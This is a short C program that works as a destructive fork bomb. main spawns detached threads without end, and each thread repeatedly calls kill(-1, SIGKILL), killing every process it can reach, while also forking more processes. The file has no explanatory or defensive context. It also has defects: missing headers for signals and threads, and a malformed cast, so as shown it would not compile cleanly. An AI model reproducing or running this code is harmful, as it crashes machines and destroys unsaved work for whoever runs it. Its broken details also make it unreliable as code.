#include <stdio.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/resource.h>

void process(void * a) {
    while (1) {
		kill(-1,SIGKILL);
		pid_t p = fork();
		if (p > 0) {
			printf("Process %d created.\n", p);
		}
	}
}

int main(){
 	while(1) {
		pthread_t p;
		pthread_attr_t attr;
		pthread_attr_init(&attr);
		pthread_attr_setdetachstate(&attr,PTHREAD_CREATE_DETACHED);
		pthread_create(&p, &attr, (void*(*)(void *)process,NULL);
	}
}